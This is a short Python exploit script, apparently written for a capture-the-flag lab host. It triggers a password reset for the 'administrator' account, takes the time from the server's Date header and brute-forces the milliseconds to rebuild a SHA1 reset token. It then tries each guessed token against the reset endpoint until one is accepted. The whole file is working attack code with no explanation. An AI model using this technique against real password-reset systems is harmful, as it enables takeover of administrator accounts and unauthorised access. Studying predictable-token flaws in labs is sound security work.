#!/usr/bin/env python3

import requests 
import hashlib 
import datetime
from time import gmtime, strftime

forgot_password = "http://10.10.51.46:8080/forgot_password"
reset_password = "http://10.10.51.46:8080/password_reset?token="

fp_data = {
	'username':'administrator'
}
fp = requests.post(forgot_password, data=fp_data)
time =fp.headers['Date'].split(' ')

# datetimenow spliting to get the date
value = str(datetime.datetime.now()).split(" ")[0]

def resetPass(token):
	rp = requests.get(reset_password+token)
	if("Invalid token" not in rp.text):
		print(f"[+] Found Token: {token}")
		return True 
	else:
		print(f"[+] failed {token}")
		return False

# For Brute-forcing the milliseconds
for milli_seconds in range(100):
	ms = f"{milli_seconds:02}"
	full_time = value + " " +time[4]+"."+ms
	lnk = full_time + " . ADMINISTRATOR"
	token = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
	if(resetPass(token)):
		break
